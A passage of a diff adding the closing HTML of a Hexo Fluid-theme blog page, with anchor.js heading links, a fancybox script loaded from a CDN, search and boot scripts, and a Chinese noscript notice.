+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
